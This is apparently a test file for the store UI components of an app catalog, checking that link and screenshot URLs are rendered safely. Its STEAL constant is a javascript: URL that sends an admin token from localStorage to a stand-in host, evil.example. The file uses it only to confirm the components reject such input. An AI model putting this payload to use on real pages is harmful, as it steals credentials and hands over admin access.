import { describe, expect, test } from 'bun:test';
import type { AppExtension } from '@bridgething/catalog';
import { isValidElement, type VNode } from 'preact';
import { AppCard } from './store/AppCard';
import { ExtensionNote } from './store/ExtensionNote';

const STEAL = "javascript:fetch('https://evil.example/'+localStorage.getItem('bridgething:admin-token'))";

function anchors(node: unknown, found: VNode<{ href?: string }>[] = []): VNode<{ href?: string }>[] {
  if (Array.isArray(node)) {
    for (const child of node) anchors(child, found);
    return found;
  }

  if (!isValidElement(node)) return found;

  const element = node as VNode<{ href?: string; children?: unknown }>;
  if (element.type === 'a') found.push(element);
  anchors(element.props.children, found);
  return found;
}

function hrefs(node: unknown): (string | undefined)[] {
  return anchors(node).map(anchor => anchor.props.href);
}

function images(node: unknown, found: VNode<{ src?: string }>[] = []): VNode<{ src?: string }>[] {
  if (Array.isArray(node)) {
    for (const child of node) images(child, found);
    return found;
  }

  if (!isValidElement(node)) return found;

  const element = node as VNode<{ src?: string; children?: unknown }>;
  if (element.type === 'img') found.push(element);
  images(element.props.children, found);
  return found;
}

function sources(node: unknown): (string | undefined)[] {
  return images(node).map(image => image.props.src);
}

describe('the extension note', () => {
  const extension: AppExtension = { desktop: true, permissions: ['all'] };

  test('links a github repo', () => {
    expect(hrefs(ExtensionNote({ extension, source: 'https://github.com/someone/thing' }))).toEqual([
      'https://github.com/someone/thing',
    ]);
  });

  test('a javascript source renders as no repository rather than a link', () => {
    expect(hrefs(ExtensionNote({ extension, source: STEAL }))).toEqual([]);
  });
});

function storeListing(screenshots?: string[]) {
  return {
    app: {
      id: '019e6701-13f8-71b5-ba04-85d326630e98',
      name: 'Calendar',
      description: 'Upcoming events.',
      author: 'JoeyEamigh',
      icon: null,
      ...(screenshots ? { screenshots } : {}),
      homepage: null,
      source: null,
      versions: [],
    },
    sourceUrl: 'https://apps.bridgething.com/catalog.json',
    newestCompatible: null,
    installedVersion: null,
    updateAvailable: false,
    alsoAvailableFrom: [],
    installs: 0,
  };
}

describe('the store card', () => {
  test('leads with the screenshot when the catalog entry carries one', () => {
    const rendered = AppCard({ listing: storeListing(['https://bridgething.com/shots/calendar.png']), source: null });

    expect(sources(rendered)).toContain('https://bridgething.com/shots/calendar.png');
  });

  test('an app with no screenshots renders no image at all', () => {
    expect(sources(AppCard({ listing: storeListing(), source: null }))).toEqual([]);
  });

  test('a javascript screenshot url never becomes an image source', () => {
    const rendered = AppCard({ listing: storeListing([STEAL]), source: null });

    expect(sources(rendered)).not.toContain(STEAL);
    expect(sources(rendered)).toEqual([]);
  });
});
